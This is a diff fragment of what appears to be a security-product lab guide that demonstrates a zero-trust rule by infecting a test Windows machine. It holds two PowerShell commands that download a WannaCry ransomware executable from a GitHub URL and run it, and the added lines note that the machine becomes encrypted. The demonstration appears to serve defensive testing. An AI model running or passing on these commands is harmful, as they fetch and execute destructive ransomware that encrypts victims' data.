@@ -28,3 +28,5 @@ Select the "Manual Command" Option
 Select the Powershell interpreter, type paste the following commands (wait for the completion of the first command before using the second command)
 "Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile wcry.exe"
 "Start-Process wcry.exe""
+
+If you check the Windows Instance, you will find the computer encrypted, and after a few minutes, you should be disconnected from the RDP Session (because of the ZTSA Rule in place).
